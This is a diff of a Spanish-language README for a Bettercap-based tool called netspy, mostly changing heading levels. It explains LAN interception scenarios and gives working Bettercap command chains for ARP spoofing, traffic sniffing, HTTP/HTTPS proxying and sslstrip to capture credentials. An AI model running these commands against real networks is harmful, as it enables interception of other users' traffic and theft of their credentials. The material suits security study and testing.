@@ -1,14 +1,12 @@
-# Interceptacion Ethernet
+# Interceptacion Ethernet (MiTM)  de trafico LAN en claro:
 
-MiTM interceptación de trafico LAN en claro:
+### Estenarios:
 
-Estenarios:
-
-1º.- Interceptación entre 2 puntos; 
+## 1º.- Interceptación entre 2 puntos; 
 
 Disponer de acceso a uno de los 2 puntos, e instalar en alguno de los extremos: Wireshark, dsniff, Smartsnif nifsoft, Bettercap, Ethercap, Extension navegador, netspy, tcpdump etc..
 
-2º.- red LAN con HUB o switch "sin inteligencia"
+## 2º.- red LAN con HUB o switch "sin inteligencia"
 
 Instalar un HUB en el medio de una red, por su modo de funcionamiento rebotan todos los pquete en todas las MAC y paquete Ethernet, par interceptación.
 
@@ -16,7 +14,7 @@ Instalar un PC conectado al HUB, con la  tarjeta  de red en modo promiscuo, que 
 
 Modificar MAC Adrees de un PC conectado a la red, con la MAC Broadcast FF:FF:FF:FF:FF:FF:FF:FF que escurche todo el trafico de la red
 
-3º.- En una red LAN con conmutadores Switch inteligente configurable :
+## 3º.- En una red LAN con conmutadores Switch inteligente configurable :
 
 Configurar port mirroning en el switch para que una copia de todo el trafico se encamine a una sola ethernet del switch, donde hay un PC en modo promiscuo con Wirehark, netspy, etc.. capturando 
 
@@ -24,7 +22,7 @@ En un PC conectado a la red instalar un Proxy, para hacer pasar, encaminar por e
 
 En un PC conectado instala un Proxy trasparente. Usa ARP Spoofing, suplantación de MAC, para encaminar y poder ver e interceptar  el trafico de otros dispositivos!
 
-4º.- Instalar  en: pasarelas, FW , routers, swithes, etc.. equipos en medio de las redes para interceptación: HUBS, switches port mirronig, proxyes, TAB .. 
+## 4º.- Instalar  en: pasarelas, FW , routers, swithes, etc.. equipos en medio de las redes para interceptación: HUBS, switches port mirronig, proxyes, TAB .. 
 
 <img style="float:left" alt="Escenarios interceptacion" src="https://github.com/hackingyseguridad/netspy/blob/master/MiTM.png">
 
@@ -34,9 +32,9 @@ En un PC conectado instala un Proxy trasparente. Usa ARP Spoofing, suplantación
 
 # netspy
 
-# 1.- Descubre elementos de red 2.- Captura y muestra en pantalla el trafico.
+## 1.- Descubre elementos de red 2.- Captura y muestra en pantalla el trafico.
 
-# Instalacion:
+## Instalacion:
 
 apt-get install bettercap
 
@@ -48,7 +46,7 @@ cd netspy
 
 chmod 777 netspy
 
-# Uso.:
+## Uso.:
 
 sh netspy
 
@@ -58,7 +56,7 @@ netdiscover
 
 IMPORTANTE: Para salir del modo de descubrimiento 'net probe on' y empezar a esnifar teclea 'exit'.
 
-# Bettercap v2.9
+## Bettercap v2.9
 
 Escanear toda la Red:
 
@@ -83,7 +81,6 @@ net.probe on; set arp.spoof.targets; arp.spoof on; set net.sniff.verbose false; 
 Ver trafico web por proxy y extrae claves de cifrados debiles:
 
 net.probe on; set arp.spoof.targets; arp.spoof on; set net.sniff.verbose false; net.sniff on; http.proxy on;  true; set http.proxy.port 80; set https.proxy.port 443; http.proxy on; https.proxy on; set http.proxy.sslstrip
-
 
 Versiones antiguas Bettercap: 1.6.1 y 1.6.2 en Python
 
